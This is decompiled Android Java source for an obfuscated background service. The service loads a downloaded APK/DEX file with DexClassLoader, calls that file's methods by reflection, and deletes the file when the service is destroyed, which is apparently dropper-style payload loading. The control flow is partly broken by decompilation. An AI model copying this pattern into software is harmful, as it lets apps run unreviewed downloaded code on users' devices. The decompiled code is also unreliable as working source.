package com.wch.c_direct;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import com.joy.lmt.LMTInvoker;
import com.wch.c_direct.a.d;
import com.wch.c_direct.a.g;
import com.wch.c_direct.logic.UpdateLOGOLogic;
import dalvik.system.DexClassLoader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class MyService
  extends Service
{
  private Class a;
  private Object b;
  private DexClassLoader c = null;
  private Intent d;
  private UpdateLOGOLogic e;
  private g f;
  private LMTInvoker g;
  private boolean h = false;
  private Handler i = new a(this);
  
  public MyService() {}
  
  private Object a(String paramString, Class[] paramArrayOfClass, Object[] paramArrayOfObject)
  {
    
    if ((this.a != null) && (this.b != null)) {
      try
      {
        paramString = this.a.getDeclaredMethod(paramString, paramArrayOfClass);
        paramString.setAccessible(true);
        paramString = paramString.invoke(this.b, paramArrayOfObject);
        return paramString;
      }
      catch (Exception paramString)
      {
        paramString.printStackTrace();
        return null;
      }
    }
    com.wch.c_direct.logic.a.a(true, null);
    return null;
  }
  
  private void a()
  {
    if (this.f != null) {
      new Thread(new b(this)).start();
    }
  }
  
  private String b()
  {
    if (this.f != null) {
      return this.f.j();
    }
    com.wch.c_direct.logic.a.a(true, null);
    return null;
  }
  
  public DexClassLoader getApkLoader(Context paramContext)
  {
    com.wch.c_direct.logic.a.a();
    paramContext = this.e.getDownloadFilePath(this);
    return new DexClassLoader(paramContext + b(), paramContext, null, ClassLoader.getSystemClassLoader().getParent());
  }
  
  public boolean loadService()
  {
    try
    {
      com.wch.c_direct.logic.a.a();
      this.c = getApkLoader(this);
      this.a = this.c.loadClass(this.f.d());
      this.b = this.a.getConstructor(new Class[0]).newInstance(new Object[0]);
      a(this.f.b(), new Class[] { Service.class }, new Object[] { this });
      String str1 = this.f.c();
      String str2 = b();
      a(str1, new Class[] { String.class }, new Object[] { str2 });
      str1 = this.f.h();
      str2 = this.f.i();
      String str3 = this.e.getDownloadFilePath(this);
      String str4 = this.f.a().a("rr");
      String str5 = this.f.a().a("lv");
      a(str1, new Class[] { String.class, String.class, String.class, String.class }, new Object[] { str2, str3, str4, str5 });
      a(this.f.n(), new Class[] { Integer.TYPE }, new Object[] { Integer.valueOf(103) });
      return true;
    }
    catch (ClassNotFoundException localClassNotFoundException)
    {
      com.wch.c_direct.logic.a.a(true, localClassNotFoundException.getMessage());
      this.e.clearVersion();
      this.e.deleteLogo();
      stopSelf();
      return false;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        com.wch.c_direct.logic.a.a(true, localException.getMessage());
        localException.printStackTrace();
      }
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    try
    {
      Intent localIntent = new Intent("android.intent.action.ltstat");
      localIntent.setFlags(32);
      sendBroadcast(localIntent);
      this.e = new UpdateLOGOLogic(this, this.i);
      this.e.revealDatas();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
  }
  
  public void onDestroy()
  {
    try
    {
      if (this.g != null) {
        this.g.unBindLMT();
      }
      if (this.f != null) {
        a(this.f.g(), new Class[0], new Object[0]);
      }
      this.e.deleteAPKDEX();
      this.h = false;
      super.onDestroy();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (this.h) {
      return 2;
    }
    this.h = true;
    com.wch.c_direct.logic.a.a();
    this.d = paramIntent;
    if (this.d != null)
    {
      paramIntent = this.d.getStringExtra("action");
      com.wch.c_direct.logic.a.a(true, "action = " + paramIntent);
      if (paramIntent != null) {
        break label94;
      }
    }
    try
    {
      com.wch.c_direct.logic.a.a(false, "");
      paramIntent = new Intent("android.intent.action.ltstat");
      paramIntent.setFlags(32);
      sendBroadcast(paramIntent);
      label94:
      com.wch.c_direct.logic.a.a(false, "");
      a();
      return 2;
    }
    catch (Exception paramIntent)
    {
      for (;;)
      {
        paramIntent.printStackTrace();
      }
    }
  }
}
